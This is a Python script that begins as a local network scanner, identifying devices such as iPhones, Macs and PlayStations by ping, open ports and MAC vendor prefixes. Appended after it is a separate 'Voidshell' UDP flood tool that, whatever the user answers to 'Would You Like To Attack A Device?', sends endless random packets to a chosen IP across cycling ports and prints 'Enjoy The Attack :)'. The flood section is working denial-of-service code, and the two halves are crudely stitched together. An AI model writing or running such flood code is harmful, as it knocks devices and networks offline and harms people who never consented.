#!/usr/bin/env python3
"""
Network Device Scanner — CLI
Requires Python 3.8+
For educational use only — only scan networks you own or have permission to scan.
"""

import socket
import subprocess
import platform
import ipaddress
import threading
import time
import json
import sys
import urllib.request
from concurrent.futures import ThreadPoolExecutor, as_completed

# ─────────────────────────────────────────────────────────────────
#  Constants
# ─────────────────────────────────────────────────────────────────

COMMON_PORTS = [
    80, 443, 8080, 22, 21, 53,
    62078, 5353, 7000, 7001, 548, 3689,
    49152, 49153, 9295, 9296, 9297, 41800,
]

APPLE_PORTS = {
    62078: "📱 iPhone / iPad",
    7000:  "📱 iPhone (AirPlay)",
    7001:  "📱 iPhone (AirPlay)",
    5353:  "🍎 Apple Device",
    548:   "🍎 Mac (File Sharing)",
    3689:  "🍎 Mac (iTunes)",
    49152: "🍎 Apple Device",
    49153: "🍎 Apple Device",
}

PLAYSTATION_PORTS = {
    9295:  "🎮 PlayStation (Remote Play)",
    9296:  "🎮 PlayStation (Remote Play)",
    41800: "🎮 PlayStation",
}

SONY_OUI_MAP = {
    "78:C8:81": "🎮 PlayStation 5", "84:E6:57": "🎮 PlayStation 5",
    "00:E4:21": "🎮 PlayStation 5", "9C:37:CB": "🎮 PlayStation 5",
    "00:D9:D1": "🎮 PlayStation 4", "0C:FE:45": "🎮 PlayStation 4",
    "2C:CC:44": "🎮 PlayStation 4", "5C:96:66": "🎮 PlayStation 4",
    "70:66:2A": "🎮 PlayStation 4", "70:9E:29": "🎮 PlayStation 4",
    "BC:33:29": "🎮 PlayStation 4", "BC:60:A7": "🎮 PlayStation 4",
    "C8:4A:A0": "🎮 PlayStation 4", "C8:63:F1": "🎮 PlayStation 4",
    "D4:F7:D5": "🎮 PlayStation 4", "F4:64:12": "🎮 PlayStation 4",
    "F8:46:1C": "🎮 PlayStation 4", "98:FA:2E": "🎮 PlayStation 4",
    "EC:74:8C": "🎮 PlayStation 4", "28:0D:FC": "🎮 PlayStation 3",
    "F8:D0:AC": "🎮 PlayStation 3", "FC:0F:E6": "🎮 PlayStation 3",
    "00:04:1F": "🎮 PlayStation",   "00:13:15": "🎮 PlayStation",
    "00:15:C1": "🎮 PlayStation",   "00:19:C5": "🎮 PlayStation",
    "00:1D:0D": "🎮 PlayStation",   "00:1F:A7": "🎮 PlayStation",
    "00:24:8D": "🎮 PlayStation",   "04:F7:78": "🎮 PlayStation",
    "0C:70:43": "🎮 PlayStation",   "28:40:DD": "🎮 PlayStation",
    "2C:9E:00": "🎮 PlayStation",   "50:B0:3B": "🎮 PlayStation",
    "68:28:6C": "🎮 PlayStation",   "A8:E3:EE": "🎮 PlayStation",
}

# ─────────────────────────────────────────────────────────────────
#  Scanner logic
# ─────────────────────────────────────────────────────────────────

def get_local_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(("8.8.8.8", 80))
        return s.getsockname()[0]
    finally:
        s.close()


def get_mac(ip):
    try:
        if platform.system().lower() == "windows":
            out = subprocess.check_output(["arp", "-a", ip], stderr=subprocess.DEVNULL).decode()
        else:
            out = subprocess.check_output(["arp", "-n", ip], stderr=subprocess.DEVNULL).decode()
        for line in out.splitlines():
            if ip in line:
                for part in line.split():
                    if len(part) == 17 and (part.count(":") == 5 or part.count("-") == 5):
                        return part.replace("-", ":").upper()
    except Exception:
        pass
    return None


def lookup_vendor(mac):
    try:
        oui = mac[:8].replace(":", "")
        url = f"https://api.maclookup.app/v2/macs/{oui}"
        req = urllib.request.Request(url, headers={"User-Agent": "NetworkScanner/1.0"})
        with urllib.request.urlopen(req, timeout=2) as resp:
            data = json.loads(resp.read())
            return data.get("company") or None
    except Exception:
        return None


def check_port(ip, port):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(0.4)
        result = s.connect_ex((str(ip), port)) == 0
        s.close()
        return result
    except Exception:
        return False


def ping(ip):
    param = "-n" if platform.system().lower() == "windows" else "-c"
    try:
        r = subprocess.run(
            ["ping", param, "1", "-W", "1", str(ip)],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
            timeout=2, close_fds=False,
        )
        if r.returncode == 0:
            return str(ip), True
    except Exception:
        pass
    for port in COMMON_PORTS:
        if check_port(ip, port):
            return str(ip), True
    return str(ip), False


def get_device_label(ip, local_ip):
    if ip == local_ip:
        return "💻 This Computer"
    try:
        name = socket.gethostbyaddr(ip)[0]
        if name and name != ip:
            n = name.upper()
            if n.startswith("PS5"): return f"🎮 PlayStation 5  ({name})"
            if n.startswith("PS4"): return f"🎮 PlayStation 4  ({name})"
            if n.startswith("PS3"): return f"🎮 PlayStation 3  ({name})"
            return name
    except socket.herror:
        pass

    mac = get_mac(ip)
    if mac:
        oui = mac[:8].upper()
        ps = SONY_OUI_MAP.get(oui)
        if ps:
            return f"{ps}  [{mac}]"

    for port, label in PLAYSTATION_PORTS.items():
        if check_port(ip, port):
            return label

    for port, label in APPLE_PORTS.items():
        if check_port(ip, port):
            return label

    if mac:
        vendor = lookup_vendor(mac)
        if vendor:
            if "sony" in vendor.lower() or "playstation" in vendor.lower():
                return f"🎮 PlayStation  [{mac}]"
            return f"{vendor}  [{mac}]"
        return f"🔌 Device  [{mac}]"

    return "🔌 Connected Device"


# ─────────────────────────────────────────────────────────────────
#  CLI
# ─────────────────────────────────────────────────────────────────

def log(msg):
    ts = time.strftime("[%H:%M:%S]")
    print(f"{ts} {msg}", flush=True)


def scan(subnet, workers=100):
    try:
        net = ipaddress.IPv4Network(subnet, strict=False)
    except ValueError:
        print(f"[!] Invalid subnet: {subnet}")
        sys.exit(1)

    hosts = [str(ip) for ip in net.hosts()]
    if not hosts:
        print("[!] No hosts in range.")
        sys.exit(1)

    local_ip = get_local_ip()
    total = len(hosts)
    scanned = 0
    found = []

    print(f"\nNETSCAN — Network Device Scanner")
    print(f"{'─' * 50}")
    print(f"  Target subnet : {subnet}")
    print(f"  Hosts to scan : {total}")
    print(f"  Threads       : {workers}")
    print(f"  Your IP       : {local_ip}")
    print(f"{'─' * 50}\n")

    start = time.time()
    log(f"Phase 1: Pinging {total} hosts...")

    alive = []
    lock = threading.Lock()

    def scan_one(ip):
        return ping(ip)

    with ThreadPoolExecutor(max_workers=workers) as ex:
        futs = {ex.submit(scan_one, ip): ip for ip in hosts}
        for fut in as_completed(futs):
            ip, is_alive = fut.result()
            with lock:
                scanned += 1
                pct = scanned / total * 100
                print(f"\r  Scanning... {scanned}/{total}  ({pct:.0f}%)", end="", flush=True)
            if is_alive:
                alive.append(ip)

    print()  # newline after progress
    log(f"Phase 1 done. {len(alive)} host(s) responded.")

    if not alive:
        print("\n[!] No devices found.")
        return

    log(f"Phase 2: Resolving {len(alive)} device(s)...\n")

    alive_sorted = sorted(alive, key=lambda ip: [int(x) for x in ip.split(".")])

    col_ip    = 18
    col_label = 40
    col_mac   = 20

    header = (
        f"  {'IP ADDRESS':<{col_ip}}"
        f"{'DEVICE / HOSTNAME':<{col_label}}"
        f"{'MAC':<{col_mac}}"
        f"NOTE"
    )
    print("─" * 90)
    print(header)
    print("─" * 90)

    for ip in alive_sorted:
        label = get_device_label(ip, local_ip)
        mac   = get_mac(ip) or "—"
        note  = "<-- You" if ip == local_ip else ""
        print(f"  {ip:<{col_ip}}{label:<{col_label}}{mac:<{col_mac}}{note}")
        found.append(ip)

    elapsed = time.time() - start
    print("─" * 90)
    print(f"\n  Scan complete: {len(found)} device(s) found in {elapsed:.1f}s\n")


# ─────────────────────────────────────────────────────────────────
if __name__ == "__main__":
    import argparse

    parser = argparse.ArgumentParser(description="NETSCAN — local network discovery tool")
    parser.add_argument(
        "subnet", nargs="?",
        help="Target subnet in CIDR notation (e.g. 192.168.1.0/24). "
             "Defaults to your local /24."
    )
    parser.add_argument(
        "-t", "--threads", type=int, default=100,
        help="Number of worker threads (default: 100)"
    )
    args = parser.parse_args()

    if args.subnet:
        target = args.subnet
    else:
        try:
            local = get_local_ip()
            base  = local.rsplit(".", 1)[0]
            target = f"{base}.0/24"
        except Exception:
            target = "192.168.1.0/24"

    scan(target, workers=args.threads)

ask = input("Would You Like To Attack A Device? (y/n): ")

import sys
import os
import time
import socket
import random
from datetime import datetime

now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

os.system("clear")
os.system("figlet Voidshell")
print("Creator    : Asser Mohamed")

print("")

ip = input("IP Target : ")
port = int(input("Port       : "))

os.system("clear")
os.system("figlet Voidshell")

print("Checking Internet Connection...")
time.sleep(3)
print("Enjoy The Attack :)")
time.sleep(1.5)

sent = 0
while True:
    try:
        sock.sendto(bytes, (ip, port))
        sent = sent + 1
        port = port + 1
        print(f"Sent {sent} packet to {ip} through port:{port}")
        if port == 65534:
            port = 1
    except KeyboardInterrupt:
        print("\n[!] Stopped by user")
        sys.exit()
    except Exception as e:
        print(f"\n[!] Error: {e}")
        sys.exit()